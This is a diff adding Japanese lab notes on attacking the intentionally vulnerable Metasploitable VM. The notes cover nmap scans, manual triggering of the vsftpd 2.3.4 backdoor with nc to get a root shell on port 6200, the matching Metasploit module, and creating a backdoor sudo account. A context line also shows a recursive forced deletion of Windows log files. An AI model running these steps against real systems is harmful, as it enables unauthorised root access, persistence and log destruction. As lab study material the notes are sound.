@@ -160,3 +160,53 @@ del %WINDIR%\*. log /a /s /q /f
 # /q: ワイルドカード使用時に確認メッセージを表示しない
 # /f: 読み取り専用ファイルを矯正削除
 ```
+
+## Metasploitableハッキング
+
+```bash
+# /etc/network/interfaces を編集
+auto eth0
+iface eth0 inet dhcp
+# ↓
+auto eth0
+iface eth0 inet static
+address 10.0.0.5
+netmask 255.255.255.0
+gateway 10.0.0.1
+```
+
+### ポートスキャン
+
+```bash
+# ネットワーク内のIP列挙
+nmap -sP 10.0.0.0/24
+# 開いているポートの列挙
+sudo nmap -sV -O -p- 10.0.0.5
+# -p-: 1〜65535ポートを対象
+# -sV: 各ポートのサービスのバージョンを検出する
+# -O: フィンガープリント。ターゲットOSを特定
+```
+
+### vsfpdのバックドアを利用
+
+```bash
+# vsfpdでTCPを開く
+nc 10.0.0.5 21
+USER attacker:)
+PASS hoge
+# 6200ポートでroot権限のシェルを開ける
+nc -nv 10.0.0.5 6200
+```
+
+### vsfpdをMetasploitで攻撃
+
+```bash
+msfconsole
+use exploit/unix/ftp/vsftpd_234_backdoor
+set RHOST 10.0.0.5
+show options
+exploit
+
+# root権限なので大抵のことはできる（例: バックドア用アカウント作成）
+useradd -m newuser -G sudo -s /bin/bash; passwd newuser
+```
